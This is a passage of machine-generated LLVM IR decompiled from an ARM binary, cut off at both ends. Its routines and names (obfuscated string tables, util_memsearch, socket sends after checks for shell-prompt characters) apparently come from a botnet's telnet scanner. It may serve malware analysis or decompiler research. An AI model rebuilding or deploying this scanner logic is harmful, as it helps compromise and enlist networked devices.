  store i8 %v2_1005c, i8* %v3_10050, align 1
  %v0_10060.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_10050, %bb386
  %v0_10060 = phi i32 [ %v3_1005c, %dec_label_pc_10050 ], [ %v0_10060.pre, %bb386 ]
  %v1_10060 = add i32 %v0_10060, 1
  store i32 %v1_10060, i32* %r2.global-to-local, align 4
  %v3_10064 = icmp uge i32 %v1_10060, %v4_10040
  store i1 %v3_10064, i1* %cpsr_c.global-to-local, align 1
  %v9_10064 = icmp eq i32 %v1_10060, %v4_10040
  store i1 %v9_10064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10064, label %dec_label_pc_1006c, label %dec_label_pc_10050

dec_label_pc_1006c:                               ; preds = %.thread63, %dec_label_pc_100c0
  store i32 ptrtoint (i32* @global_var_23644.163 to i32), i32* @ip, align 4
  %v0_10070 = load i32, i32* @r5, align 4
  %v1_10070 = add i32 %v0_10070, 24
  %v2_10070 = inttoptr i32 %v1_10070 to i32*
  %v3_10070 = load i32, i32* %v2_10070, align 4
  %v2_10074 = load i32, i32* @global_var_23644.163, align 4
  store i32 %v2_10074, i32* %r2.global-to-local, align 4
  %v2_10078 = add i32 %v3_10070, %v4_10040
  store i32 %v2_10078, i32* %r3.global-to-local, align 4
  store i32 %v2_10078, i32* %v2_10070, align 4
  %v0_10080 = load i32, i32* %r2.global-to-local, align 4
  %v1_10080 = load i32, i32* @r5, align 4
  %v2_10080 = add i32 %v1_10080, 8
  %v3_10080 = inttoptr i32 %v2_10080 to i32*
  store i32 %v0_10080, i32* %v3_10080, align 4
  br label %dec_label_pc_10084

dec_label_pc_10084:                               ; preds = %dec_label_pc_101a4, %dec_label_pc_1006c
  %v0_10084 = load i32, i32* @r5, align 4
  %v1_10084 = add i32 %v0_10084, 12
  %v2_10084 = inttoptr i32 %v1_10084 to i32*
  %v3_10084 = load i32, i32* %v2_10084, align 4
  store i32 %v3_10084, i32* %r0.global-to-local, align 4
  %v1_10088 = add i32 %v3_10084, -2
  store i32 %v1_10088, i32* @r3, align 4
  %v7_1008c = icmp eq i32 %v1_10088, 8
  store i1 %v7_1008c, i1* %cpsr_z.global-to-local, align 1
  %v5_10090 = and i32 %v1_10088, 1073741824
  %v6_10090 = icmp ne i32 %v5_10090, 0
  store i1 %v6_10090, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10084, label %dec_label_pc_10008.backedge [
    i32 2, label %dec_label_pc_1089c
    i32 3, label %dec_label_pc_106b0
    i32 4, label %dec_label_pc_107a8
    i32 5, label %dec_label_pc_1051c
    i32 6, label %dec_label_pc_10374
    i32 7, label %dec_label_pc_102a0
    i32 8, label %dec_label_pc_10448
    i32 9, label %dec_label_pc_101cc
    i32 10, label %dec_label_pc_10128
  ]

dec_label_pc_100bc:                               ; preds = %dec_label_pc_10020
  br i1 %v2_10044, label %dec_label_pc_10cd4, label %dec_label_pc_100c0

dec_label_pc_100c0:                               ; preds = %dec_label_pc_100bc
  %v3_100c0 = icmp eq i32 %v4_10040, -1
  store i1 %v3_100c0, i1* %cpsr_c.global-to-local, align 1
  %v8_100c0 = icmp eq i32 %v4_10040, -1
  store i1 %v8_100c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_100c0, label %dec_label_pc_100c8, label %dec_label_pc_1006c

dec_label_pc_100c8:                               ; preds = %dec_label_pc_100c0
  %v0_100c8 = load i32, i32* @sb, align 4
  %v1_100c8 = inttoptr i32 %v0_100c8 to i32*
  %v2_100c8 = load i32, i32* %v1_100c8, align 4
  store i32 %v2_100c8, i32* %r3.global-to-local, align 4
  %v2_100cc = icmp ugt i32 %v2_100c8, 10
  store i1 %v2_100cc, i1* %cpsr_c.global-to-local, align 1
  %v7_100cc = icmp eq i32 %v2_100c8, 11
  store i1 %v7_100cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100cc, label %dec_label_pc_10110, label %dec_label_pc_100d4

dec_label_pc_100d4:                               ; preds = %dec_label_pc_100c8, %dec_label_pc_10cd4
  %v0_100d4 = load i32, i32* @r5, align 4
  %v1_100d4 = add i32 %v0_100d4, 4
  %v2_100d4 = inttoptr i32 %v1_100d4 to i32*
  %v3_100d4 = load i32, i32* %v2_100d4, align 4
  store i32 %v3_100d4, i32* %r0.global-to-local, align 4
  %v1_100d8 = call i32 @__GI___libc_close(i32 %v3_100d4)
  store i32 %v1_100d8, i32* %r0.global-to-local, align 4
  %v0_100dc = load i32, i32* @r5, align 4
  %v1_100dc = add i32 %v0_100dc, 284
  %v2_100dc = inttoptr i32 %v1_100dc to i8*
  %v3_100dc = load i8, i8* %v2_100dc, align 1
  %v4_100dc = zext i8 %v3_100dc to i32
  %v1_100e0 = add nuw nsw i32 %v4_100dc, 1
  %v1_100e4 = urem i32 %v1_100e0, 256
  store i32 %v1_100e4, i32* %r3.global-to-local, align 4
  %v2_100e8 = icmp ugt i32 %v1_100e4, 8
  store i1 %v2_100e8, i1* %cpsr_c.global-to-local, align 1
  %v7_100e8 = icmp eq i32 %v1_100e4, 9
  store i1 %v7_100e8, i1* %cpsr_z.global-to-local, align 1
  %v1_100ec = trunc i32 %v1_100e0 to i8
  store i8 %v1_100ec, i8* %v2_100dc, align 1
  %v0_100f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_100f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_100f0 = xor i1 %v1_100f0, true
  %v3_100f0 = and i1 %v0_100f0, %v2_100f0
  br i1 %v3_100f0, label %bb387, label %.thread293

.thread293:                                       ; preds = %dec_label_pc_100d4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v1_100fc289294 = load i32, i32* @r5, align 4
  %v2_100fc290295 = add i32 %v1_100fc289294, 4
  %v3_100fc291296 = inttoptr i32 %v2_100fc290295 to i32*
  store i32 -1, i32* %v3_100fc291296, align 4
  br label %bb388

bb387:                                            ; preds = %dec_label_pc_100d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100fc285 = load i32, i32* @r5, align 4
  %v2_100fc286 = add i32 %v1_100fc285, 4
  %v3_100fc287 = inttoptr i32 %v2_100fc286 to i32*
  store i32 -1, i32* %v3_100fc287, align 4
  %v4_10100 = load i32, i32* %r0.global-to-local, align 4
  %v5_10100 = load i32, i32* @r5, align 4
  %v6_10100 = add i32 %v5_10100, 12
  %v7_10100 = inttoptr i32 %v6_10100 to i32*
  store i32 %v4_10100, i32* %v7_10100, align 4
  %v4_10104 = load i32, i32* %r3.global-to-local, align 4
  %v5_10104 = trunc i32 %v4_10104 to i8
  %v6_10104 = load i32, i32* @r5, align 4
  %v7_10104 = add i32 %v6_10104, 284
  %v8_10104 = inttoptr i32 %v7_10104 to i8*
  store i8 %v5_10104, i8* %v8_10104, align 1
  %v0_10108.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10108.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb388

bb388:                                            ; preds = %.thread293, %bb387
  %v1_1010c = phi i1 [ %v1_10108.pre, %bb387 ], [ %v0_100f0, %.thread293 ]
  %v0_1010c = phi i1 [ %v0_10108.pre, %bb387 ], [ %v1_100f0, %.thread293 ]
  %v2_10108 = xor i1 %v1_1010c, true
  %v3_10108 = or i1 %v0_1010c, %v2_10108
  br i1 %v3_10108, label %bb389, label %bb390

bb389:                                            ; preds = %bb388
  %v4_10108 = load i32, i32* @r5, align 4
  store i32 %v4_10108, i32* %r0.global-to-local, align 4
  br label %bb390

bb390:                                            ; preds = %bb388, %bb389
  store i32 65808, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10108, i32 ptrtoint (i32* @global_var_f388.260 to i32))
  br label %dec_label_pc_10110

dec_label_pc_10110:                               ; preds = %dec_label_pc_10004.loopexit, %dec_label_pc_10008.backedge, %dec_label_pc_10004.preheader, %dec_label_pc_100c8, %dec_label_pc_ffe8, %dec_label_pc_ff9c, %dec_label_pc_10c30, %bb390
  %v3_10110 = load i16, i16* %stack_var_-52, align 2
  %v4_10110 = sext i16 %v3_10110 to i32
  store i32 %v4_10110, i32* %r3.global-to-local, align 4
  %v1_10114 = add nsw i32 %v4_10110, 1
  store i32 %v1_10114, i32* @r4, align 4
  %v2_10118 = icmp ugt i32 %v1_10114, 254
  store i1 %v2_10118, i1* %cpsr_c.global-to-local, align 1
  %v7_10118 = icmp eq i32 %v1_10114, 255
  store i1 %v7_10118, i1* %cpsr_z.global-to-local, align 1
  %v5_1011c = trunc i32 %v1_10114 to i16
  store i16 %v5_1011c, i16* %stack_var_-52, align 2
  %v7_10120 = icmp sgt i16 %v3_10110, 254
  br i1 %v7_10120, label %dec_label_pc_f9d0, label %dec_label_pc_ff9c

dec_label_pc_10128:                               ; preds = %dec_label_pc_10084
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_1012c = call i32 @table_unlock_val(i32 30)
  store i32 %v2_10754, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_1013c = call i32 @table_retrieve_val(i32 30, i32* %v2_1075c)
  %v3_10140 = load i8, i8* %stack_var_-56, align 1
  %v4_10140 = sext i8 %v3_10140 to i32
  store i32 %v3_1013c, i32* %r2.global-to-local, align 4
  %v1_10148 = add nsw i32 %v4_10140, -1
  store i32 %v1_10148, i32* %r3.global-to-local, align 4
  %v0_1014c = load i32, i32* @sl, align 4
  store i32 %v0_1014c, i32* %r0.global-to-local, align 4
  %v0_10150 = load i32, i32* @r5, align 4
  %v1_10150 = add i32 %v0_10150, 24
  %v2_10150 = inttoptr i32 %v1_10150 to i32*
  %v3_10150 = load i32, i32* %v2_10150, align 4
  store i32 %v3_10150, i32* %r1.global-to-local, align 4
  %v4_10154 = call i32 @util_memsearch(i32 %v0_1014c, i32 %v3_10150, i32 %v3_1013c, i32 %v1_10148)
  %v2_10158 = icmp eq i32 %v4_10154, -1
  store i1 %v2_10158, i1* %cpsr_c.global-to-local, align 1
  %v7_10158 = icmp eq i32 %v4_10154, -1
  store i1 %v7_10158, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_10154, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_10a24 = call i32 @table_lock_val(i32 30)
  br i1 %v7_10158, label %dec_label_pc_10a20, label %dec_label_pc_10164

dec_label_pc_10164:                               ; preds = %dec_label_pc_10128
  store i32 %v1_10a24, i32* %r0.global-to-local, align 4
  %v0_1016c = load i32, i32* @r5, align 4
  %v1_1016c = add i32 %v0_1016c, 4
  %v2_1016c = inttoptr i32 %v1_1016c to i32*
  %v3_1016c = load i32, i32* %v2_1016c, align 4
  store i32 %v3_1016c, i32* %r0.global-to-local, align 4
  %v1_10170 = call i32 @__GI___libc_close(i32 %v3_1016c)
  store i32 %v1_10170, i32* %r0.global-to-local, align 4
  %v0_10174 = load i32, i32* @r5, align 4
  %v1_10174 = add i32 %v0_10174, 284
  %v2_10174 = inttoptr i32 %v1_10174 to i8*
  %v3_10174 = load i8, i8* %v2_10174, align 1
  %v4_10174 = zext i8 %v3_10174 to i32
  %v1_10178 = add nuw nsw i32 %v4_10174, 1
  %v1_1017c = urem i32 %v1_10178, 256
  store i32 %v1_1017c, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10184 = icmp ugt i32 %v1_1017c, 9
  store i1 %v2_10184, i1* %cpsr_c.global-to-local, align 1
  %v7_10184 = icmp eq i32 %v1_1017c, 10
  store i1 %v7_10184, i1* %cpsr_z.global-to-local, align 1
  %v2_10188 = add i32 %v0_10174, 4
  %v3_10188 = inttoptr i32 %v2_10188 to i32*
  store i32 -1, i32* %v3_10188, align 4
  %v0_1018c = load i32, i32* @r3, align 4
  %v1_1018c = trunc i32 %v0_1018c to i8
  %v2_1018c = load i32, i32* @r5, align 4
  %v3_1018c = add i32 %v2_1018c, 284
  %v4_1018c = inttoptr i32 %v3_1018c to i8*
  store i8 %v1_1018c, i8* %v4_1018c, align 1
  %v0_10190 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10190, label %dec_label_pc_10194, label %dec_label_pc_10b14

dec_label_pc_10194:                               ; preds = %dec_label_pc_10164
  store i32 0, i32* @r3, align 4
  %v1_10198 = load i32, i32* @r5, align 4
  %v2_10198 = add i32 %v1_10198, 12
  %v3_10198 = inttoptr i32 %v2_10198 to i32*
  store i32 0, i32* %v3_10198, align 4
  %v0_1019c = load i32, i32* @r3, align 4
  %v1_1019c = trunc i32 %v0_1019c to i8
  %v2_1019c = load i32, i32* @r5, align 4
  %v3_1019c = add i32 %v2_1019c, 284
  %v4_1019c = inttoptr i32 %v3_1019c to i8*
  store i8 %v1_1019c, i8* %v4_1019c, align 1
  br label %dec_label_pc_101a0

dec_label_pc_101a0:                               ; preds = %dec_label_pc_10b14, %dec_label_pc_10194
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_101a4

dec_label_pc_101a4:                               ; preds = %dec_label_pc_10890, %dec_label_pc_10658, %dec_label_pc_104c4, %dec_label_pc_103f0, %dec_label_pc_1031c, %dec_label_pc_10248, %dec_label_pc_101a0
  %v0_101a4 = load i32, i32* @r5, align 4
  %v1_101a4 = add i32 %v0_101a4, 24
  %v2_101a4 = inttoptr i32 %v1_101a4 to i32*
  %v3_101a4 = load i32, i32* %v2_101a4, align 4
  %v0_101a8 = load i32, i32* @r7, align 4
  %v2_101a8 = sub i32 %v0_101a8, %v3_101a4
  %v3_101a8 = icmp uge i32 %v0_101a8, %v3_101a4
  store i1 %v3_101a8, i1* %cpsr_c.global-to-local, align 1
  %v4_101a8 = xor i32 %v0_101a8, %v3_101a4
  %v5_101a8 = xor i32 %v2_101a8, %v0_101a8
  %v6_101a8 = and i32 %v5_101a8, %v4_101a8
  %v7_101a8 = icmp slt i32 %v6_101a8, 0
  %v8_101a8 = icmp slt i32 %v2_101a8, 0
  %v9_101a8 = icmp eq i32 %v0_101a8, %v3_101a4
  store i1 %v9_101a8, i1* %cpsr_z.global-to-local, align 1
  %v2_101ac = xor i1 %v8_101a8, %v7_101a8
  %v0_101a8.v3_101a4 = select i1 %v2_101ac, i32 %v0_101a8, i32 %v3_101a4
  store i32 %v0_101a8.v3_101a4, i32* %r1.global-to-local, align 4
  %v2_101b4 = sub i32 %v3_101a4, %v0_101a8.v3_101a4
  store i32 %v2_101b4, i32* @r2, align 4
  store i32 %v2_101b4, i32* %v2_101a4, align 4
  %v0_101bc = load i32, i32* @sl, align 4
  %v1_101bc = load i32, i32* %r1.global-to-local, align 4
  %v2_101bc = add i32 %v1_101bc, %v0_101bc
  store i32 %v2_101bc, i32* @r1, align 4
  store i32 %v0_101bc, i32* @r0, align 4
  %v3_101c4 = call i32 @memmove(i32 %v0_101bc, i32 %v2_101bc, i32 %v2_101b4)
  store i32 %v3_101c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10084

dec_label_pc_101cc:                               ; preds = %dec_label_pc_10084
  %v1_101cc = add i32 %v0_10084, 24
  %v2_101cc = inttoptr i32 %v1_101cc to i32*
  %v3_101cc = load i32, i32* %v2_101cc, align 4
  store i32 %v3_101cc, i32* %r2.global-to-local, align 4
  %v1_101d0 = add i32 %v3_101cc, -1
  store i32 %v1_101d0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_101d4 = icmp eq i32 %v1_101d0, 0
  store i1 %v2_101d4, i1* %cpsr_z.global-to-local, align 1
  %tmp393 = icmp slt i32 %v1_101d0, 1
  br i1 %tmp393, label %dec_label_pc_10008.backedge.thread, label %dec_label_pc_101dc

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101cc
  %v2_101dc = add i32 %v1_101d0, %v0_10084
  store i32 %v2_101dc, i32* %r3.global-to-local, align 4
  %v1_101e0 = add i32 %v2_101dc, 28
  %v2_101e0 = inttoptr i32 %v1_101e0 to i8*
  %v3_101e0 = load i8, i8* %v2_101e0, align 1
  %v4_101e0 = zext i8 %v3_101e0 to i32
  store i32 %v4_101e0, i32* %r3.global-to-local, align 4
  %v2_101e4 = icmp ugt i8 %v3_101e0, 61
  store i1 %v2_101e4, i1* %cpsr_c.global-to-local, align 1
  %v7_101e4 = icmp eq i8 %v3_101e0, 62
  store i1 %v7_101e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101e4, label %dec_label_pc_10248, label %bb394

bb394:                                            ; preds = %dec_label_pc_101dc
  %v3_101e8 = icmp ugt i8 %v3_101e0, 57
  store i1 %v3_101e8, i1* %cpsr_c.global-to-local, align 1
  %v8_101e8 = icmp eq i8 %v3_101e0, 58
  store i1 %v8_101e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_101e8, label %dec_label_pc_10248, label %dec_label_pc_101f0

dec_label_pc_101f0:                               ; preds = %bb394
  %v2_101f0 = icmp ugt i8 %v3_101e0, 35
  store i1 %v2_101f0, i1* %cpsr_c.global-to-local, align 1
  %v7_101f0 = icmp eq i8 %v3_101e0, 36
  store i1 %v7_101f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101f0, label %dec_label_pc_10248, label %dec_label_pc_101f8

dec_label_pc_101f8:                               ; preds = %dec_label_pc_101f0
  %v2_101f8 = icmp ugt i8 %v3_101e0, 34
  store i1 %v2_101f8, i1* %cpsr_c.global-to-local, align 1
  %v7_101f8 = icmp eq i8 %v3_101e0, 35
  store i1 %v7_101f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101f8, label %dec_label_pc_10248, label %dec_label_pc_10200

dec_label_pc_10200:                               ; preds = %dec_label_pc_101f8
  %v2_10200 = icmp ugt i8 %v3_101e0, 36
  store i1 %v2_10200, i1* %cpsr_c.global-to-local, align 1
  %v7_10200 = icmp eq i8 %v3_101e0, 37
  store i1 %v7_10200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10200, label %dec_label_pc_10248, label %dec_label_pc_10230.preheader

dec_label_pc_10230.preheader:                     ; preds = %dec_label_pc_10200
  %v3_10204 = add i32 %v0_10084, 28
  %v2_10208 = add i32 %v3_10204, %v3_101cc
  store i32 %v2_10208, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10230

dec_label_pc_10214:                               ; preds = %bb395
  %v2_10214 = icmp ugt i8 %v3_10238, 35
  store i1 %v2_10214, i1* %cpsr_c.global-to-local, align 1
  %v7_10214 = icmp eq i8 %v3_10238, 36
  store i1 %v7_10214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10214, label %dec_label_pc_10248, label %dec_label_pc_1021c

dec_label_pc_1021c:                               ; preds = %dec_label_pc_10214
  %v2_1021c = icmp ugt i8 %v3_10238, 34
  store i1 %v2_1021c, i1* %cpsr_c.global-to-local, align 1
  %v7_1021c = icmp eq i8 %v3_10238, 35
  store i1 %v7_1021c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1021c, label %dec_label_pc_10248, label %dec_label_pc_10224

dec_label_pc_10224:                               ; preds = %dec_label_pc_1021c
  %v2_10224 = icmp ugt i8 %v3_10238, 36
  store i1 %v2_10224, i1* %cpsr_c.global-to-local, align 1
  %v7_10224 = icmp eq i8 %v3_10238, 37
  store i1 %v7_10224, i1* %cpsr_z.global-to-local, align 1
  %v1_10228 = add i32 %v0_10228, -1
  store i32 %v1_10228, i32* %r3.global-to-local, align 4
  br i1 %v7_10224, label %dec_label_pc_10248, label %dec_label_pc_10230

dec_label_pc_10230:                               ; preds = %dec_label_pc_10230.preheader, %dec_label_pc_10224
  %v0_10228 = phi i32 [ %v2_10208, %dec_label_pc_10230.preheader ], [ %v1_10228, %dec_label_pc_10224 ]
  %v0_10230 = phi i32 [ %v1_101d0, %dec_label_pc_10230.preheader ], [ %v1_10230, %dec_label_pc_10224 ]
  %v1_10230 = add i32 %v0_10230, -1
  store i32 %v1_10230, i32* %r1.global-to-local, align 4
  %v2_10230 = icmp ne i32 %v0_10230, 0
  store i1 %v2_10230, i1* %cpsr_c.global-to-local, align 1
  %v7_10230 = icmp eq i32 %v0_10230, 1
  store i1 %v7_10230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10230, label %dec_label_pc_10008.backedge.thread528, label %dec_label_pc_10238

dec_label_pc_10238:                               ; preds = %dec_label_pc_10230
  %v1_10238 = add i32 %v0_10228, -2
  %v2_10238 = inttoptr i32 %v1_10238 to i8*
  %v3_10238 = load i8, i8* %v2_10238, align 1
  %v4_10238 = zext i8 %v3_10238 to i32
  store i32 %v4_10238, i32* %r2.global-to-local, align 4
  %v2_1023c = icmp ugt i8 %v3_10238, 61
  store i1 %v2_1023c, i1* %cpsr_c.global-to-local, align 1
  %v7_1023c = icmp eq i8 %v3_10238, 62
  store i1 %v7_1023c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1023c, label %dec_label_pc_10248, label %bb395

bb395:                                            ; preds = %dec_label_pc_10238
  %v3_10240 = icmp ugt i8 %v3_10238, 57
  store i1 %v3_10240, i1* %cpsr_c.global-to-local, align 1
  %v8_10240 = icmp eq i8 %v3_10238, 58
  store i1 %v8_10240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10240, label %dec_label_pc_10248, label %dec_label_pc_10214

dec_label_pc_10248:                               ; preds = %dec_label_pc_10238, %bb395, %dec_label_pc_10224, %dec_label_pc_1021c, %dec_label_pc_10214, %dec_label_pc_10200, %dec_label_pc_101dc, %dec_label_pc_101f8, %dec_label_pc_101f0, %bb394
  %v0_1024c = phi i32 [ %v1_101d0, %dec_label_pc_10200 ], [ %v1_101d0, %dec_label_pc_101dc ], [ %v1_101d0, %dec_label_pc_101f8 ], [ %v1_101d0, %dec_label_pc_101f0 ], [ %v1_101d0, %bb394 ], [ %v1_10230, %dec_label_pc_10214 ], [ %v1_10230, %dec_label_pc_1021c ], [ %v1_10230, %dec_label_pc_10224 ], [ %v1_10230, %bb395 ], [ %v1_10230, %dec_label_pc_10238 ]
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_1024c = add i32 %v0_1024c, 1
  store i32 %v1_1024c, i32* @r7, align 4
  %v1_10250 = call i32 @table_unlock_val(i32 28)
  store i32 %v2_10740, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_10260 = call i32 @table_retrieve_val(i32 28, i32* nonnull %stack_var_-60)
  store i32 %v3_10260, i32* %r0.global-to-local, align 4
  %v3_10264 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10264, i32* %r2.global-to-local, align 4
  store i32 %v3_10260, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10270 = load i32, i32* @r5, align 4
  %v1_10270 = add i32 %v0_10270, 4
  %v2_10270 = inttoptr i32 %v1_10270 to i32*
  %v3_10270 = load i32, i32* %v2_10270, align 4
  store i32 %v3_10270, i32* %r0.global-to-local, align 4
  %v4_10274 = call i32 @__libc_send(i32 %v3_10270, i32 %v3_10260, i32 %v3_10264, i32 16384)
  store i32 %v4_10274, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10284 = load i32, i32* @r5, align 4
  %v1_10284 = add i32 %v0_10284, 4
  %v2_10284 = inttoptr i32 %v1_10284 to i32*
  %v3_10284 = load i32, i32* %v2_10284, align 4
  store i32 %v3_10284, i32* %r0.global-to-local, align 4
  %v4_10288 = call i32 @__libc_send(i32 %v3_10284, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2, i32 16384)
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_10290 = call i32 @table_lock_val(i32 28)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10298 = load i32, i32* @r5, align 4
  %v2_10298 = add i32 %v1_10298, 12
  %v3_10298 = inttoptr i32 %v2_10298 to i32*
  store i32 10, i32* %v3_10298, align 4
  br label %dec_label_pc_101a4

dec_label_pc_102a0:                               ; preds = %dec_label_pc_10084
  %v1_102a0 = add i32 %v0_10084, 24
  %v2_102a0 = inttoptr i32 %v1_102a0 to i32*
  %v3_102a0 = load i32, i32* %v2_102a0, align 4
  store i32 %v3_102a0, i32* %r2.global-to-local, align 4
  %v1_102a4 = add i32 %v3_102a0, -1
  store i32 %v1_102a4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_102a8 = icmp eq i32 %v1_102a4, 0
  store i1 %v2_102a8, i1* %cpsr_z.global-to-local, align 1
  %tmp396 = icmp slt i32 %v1_102a4, 1
  br i1 %tmp396, label %dec_label_pc_10008.backedge.thread, label %dec_label_pc_102b0

dec_label_pc_102b0:                               ; preds = %dec_label_pc_102a0
  %v2_102b0 = add i32 %v1_102a4, %v0_10084
  store i32 %v2_102b0, i32* %r3.global-to-local, align 4
  %v1_102b4 = add i32 %v2_102b0, 28
  %v2_102b4 = inttoptr i32 %v1_102b4 to i8*
  %v3_102b4 = load i8, i8* %v2_102b4, align 1
  %v4_102b4 = zext i8 %v3_102b4 to i32
  store i32 %v4_102b4, i32* %r3.global-to-local, align 4
  %v2_102b8 = icmp ugt i8 %v3_102b4, 61
  store i1 %v2_102b8, i1* %cpsr_c.global-to-local, align 1
  %v7_102b8 = icmp eq i8 %v3_102b4, 62
  store i1 %v7_102b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102b8, label %dec_label_pc_1031c, label %bb397

bb397:                                            ; preds = %dec_label_pc_102b0
  %v3_102bc = icmp ugt i8 %v3_102b4, 57
  store i1 %v3_102bc, i1* %cpsr_c.global-to-local, align 1
  %v8_102bc = icmp eq i8 %v3_102b4, 58
  store i1 %v8_102bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_102bc, label %dec_label_pc_1031c, label %dec_label_pc_102c4

dec_label_pc_102c4:                               ; preds = %bb397
  %v2_102c4 = icmp ugt i8 %v3_102b4, 35
  store i1 %v2_102c4, i1* %cpsr_c.global-to-local, align 1
  %v7_102c4 = icmp eq i8 %v3_102b4, 36
  store i1 %v7_102c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102c4, label %dec_label_pc_1031c, label %dec_label_pc_102cc

dec_label_pc_102cc:                               ; preds = %dec_label_pc_102c4
  %v2_102cc = icmp ugt i8 %v3_102b4, 34
  store i1 %v2_102cc, i1* %cpsr_c.global-to-local, align 1
  %v7_102cc = icmp eq i8 %v3_102b4, 35
  store i1 %v7_102cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102cc, label %dec_label_pc_1031c, label %dec_label_pc_102d4

dec_label_pc_102d4:                               ; preds = %dec_label_pc_102cc
  %v2_102d4 = icmp ugt i8 %v3_102b4, 36
  store i1 %v2_102d4, i1* %cpsr_c.global-to-local, align 1
  %v7_102d4 = icmp eq i8 %v3_102b4, 37
  store i1 %v7_102d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102d4, label %dec_label_pc_1031c, label %dec_label_pc_10304.preheader

dec_label_pc_10304.preheader:                     ; preds = %dec_label_pc_102d4
  %v3_102d8 = add i32 %v0_10084, 28
  %v2_102dc = add i32 %v3_102d8, %v3_102a0
  store i32 %v2_102dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10304

dec_label_pc_102e8:                               ; preds = %bb398
  %v2_102e8 = icmp ugt i8 %v3_1030c, 35
  store i1 %v2_102e8, i1* %cpsr_c.global-to-local, align 1
  %v7_102e8 = icmp eq i8 %v3_1030c, 36
  store i1 %v7_102e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102e8, label %dec_label_pc_1031c, label %dec_label_pc_102f0

dec_label_pc_102f0:                               ; preds = %dec_label_pc_102e8
  %v2_102f0 = icmp ugt i8 %v3_1030c, 34
  store i1 %v2_102f0, i1* %cpsr_c.global-to-local, align 1
  %v7_102f0 = icmp eq i8 %v3_1030c, 35
  store i1 %v7_102f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102f0, label %dec_label_pc_1031c, label %dec_label_pc_102f8

dec_label_pc_102f8:                               ; preds = %dec_label_pc_102f0
  %v2_102f8 = icmp ugt i8 %v3_1030c, 36
  store i1 %v2_102f8, i1* %cpsr_c.global-to-local, align 1
  %v7_102f8 = icmp eq i8 %v3_1030c, 37
  store i1 %v7_102f8, i1* %cpsr_z.global-to-local, align 1
  %v1_102fc = add i32 %v0_102fc, -1
  store i32 %v1_102fc, i32* %r3.global-to-local, align 4
  br i1 %v7_102f8, label %dec_label_pc_1031c, label %dec_label_pc_10304

dec_label_pc_10304:                               ; preds = %dec_label_pc_10304.preheader, %dec_label_pc_102f8
  %v0_102fc = phi i32 [ %v2_102dc, %dec_label_pc_10304.preheader ], [ %v1_102fc, %dec_label_pc_102f8 ]
  %v0_10304 = phi i32 [ %v1_102a4, %dec_label_pc_10304.preheader ], [ %v1_10304, %dec_label_pc_102f8 ]
  %v1_10304 = add i32 %v0_10304, -1
  store i32 %v1_10304, i32* %r1.global-to-local, align 4
  %v2_10304 = icmp ne i32 %v0_10304, 0
  store i1 %v2_10304, i1* %cpsr_c.global-to-local, align 1
  %v7_10304 = icmp eq i32 %v0_10304, 1
  store i1 %v7_10304, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10304, label %dec_label_pc_10008.backedge.thread528, label %dec_label_pc_1030c

dec_label_pc_1030c:                               ; preds = %dec_label_pc_10304
  %v1_1030c = add i32 %v0_102fc, -2
  %v2_1030c = inttoptr i32 %v1_1030c to i8*
  %v3_1030c = load i8, i8* %v2_1030c, align 1
